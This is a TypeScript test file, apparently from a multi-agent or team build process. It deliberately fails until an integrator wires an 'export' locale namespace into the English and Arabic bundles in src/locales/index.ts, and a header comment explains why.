// THIS TEST IS RED UNTIL THE INTEGRATOR WIRES THE NAMESPACE, and that is its
// entire job. `src/locales/index.ts` is integrator-owned (EXECUTION-PLAN
// §1.0.2), so this worker must not edit it — but a note in a handoff document is
// exactly the mechanism that failed the last time this happened, and
// localeReach.test.ts's own header tells the story: eight `admin.tracks.sla*`
// keys written by a worker who correctly did not touch `admin.json`, a truncated
// handoff note, and a release whose fieldset legend read "admin.tracks.slaOverrides"
// in both languages with every gate green.
//
// A red test cannot be truncated. The integrator runs `npm run test` at T1; this
// fails with the exact edit it needs, and the wave cannot close around it.

describe('export namespace is wired into src/locales/index.ts', () => {
  it('appears in both bundles, with every key the screen asks for', () => {
    // The fix, in full:
    //   import enExport from './en/export.json'      (alphabetical: after enEntry)
    //   import arExport from './ar/export.json'
    //   EN_NAMESPACES: { …, export: enExport, … }    AR_NAMESPACES: { …, export: arExport, … }
    //   en: { …, ...enExport, … }                    ar: { …, ...arExport, … }
    expect(Object.keys(EN_NAMESPACES), 'en/export.json not wired').toContain('export')
    expect(Object.keys(AR_NAMESPACES), 'ar/export.json not wired').toContain('export')
    // Wired to the RIGHT file, not to a placeholder — the same object identity,
    // so the merged bundle and the parity gate see what this file just checked.
    expect(EN_NAMESPACES.export).toBe(enExport)
    expect(AR_NAMESPACES.export).toBe(arExport)
  })
})
